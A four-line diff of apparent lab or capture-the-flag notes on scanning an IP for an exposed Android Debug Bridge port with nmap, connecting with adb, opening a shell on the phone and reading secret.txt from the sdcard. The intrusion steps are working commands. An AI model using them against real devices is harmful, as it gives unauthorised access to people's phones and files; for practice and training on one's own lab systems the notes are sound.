@@ -1,0 +1,4 @@
+nmap ip -sV -p 5555    (Scan for adb port)
+adb connect IP:5555    (Connect adb with parrot)
+adb shell              (Access mobile device on parrot)
+pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
